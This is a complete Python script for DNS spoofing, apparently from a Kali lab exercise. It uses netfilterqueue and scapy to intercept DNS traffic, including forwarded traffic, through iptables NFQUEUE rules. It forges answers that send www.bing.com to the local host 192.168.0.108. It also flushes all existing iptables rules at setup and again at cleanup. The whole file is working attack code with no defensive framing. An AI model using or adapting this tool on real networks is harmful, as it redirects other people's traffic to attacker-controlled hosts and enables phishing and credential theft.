#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import subprocess
import os


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        # Get the domain name from the DNS request
        try:
            qname = scapy_packet[scapy.DNSQR].qname.decode('utf-8')
            print(f"[+] DNS Request: {qname}")

            # Check if the domain is www.bing.com (with or without trailing dot)
            if "www.bing.com" in qname:
                print(f"[+] Spoofing: {qname} -> 192.168.0.108")

                # Create spoofed answer
                answer = scapy.DNSRR(
                    rrname=qname,
                    rdata="192.168.0.108"
                )
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                # Remove checksums
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                # Set modified payload
                packet.set_payload(bytes(scapy_packet))
                print(f"[+] Successfully spoofed!")
        except Exception as e:
            print(f"[-] Error: {e}")

    # Always accept the packet
    packet.accept()


def setup_iptables():
    # Flush all existing rules
    os.system("iptables --flush")
    os.system("iptables -t nat --flush")

    # Capture DNS traffic on ALL chains
    # This catches DNS requests going OUT (from Kali)
    os.system("iptables -I OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 0")

    # This catches DNS responses coming IN (to Kali)
    os.system("iptables -I INPUT -p udp --sport 53 -j NFQUEUE --queue-num 0")

    # This catches DNS requests being FORWARDED (through Kali)
    os.system("iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0")

    # Alternative: Catch ALL traffic (for debugging)
    # os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")


def cleanup():
    os.system("iptables --flush")
    os.system("iptables -t nat --flush")


if __name__ == "__main__":
    try:
        print("[+] Setting up iptables...")
        setup_iptables()

        print("[+] DNS Spoofer Started")
        print("[+] Target: www.bing.com -> 192.168.0.108")
        print("[+] Testing: ping -c 1 www.bing.com")
        print("[+] Press Ctrl+C to stop\n")

        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()

    except KeyboardInterrupt:
        print("\n[+] Stopping...")
        cleanup()
        print("[+] Done!")
    except Exception as e:
        print(f"[-] Error: {e}")
        cleanup()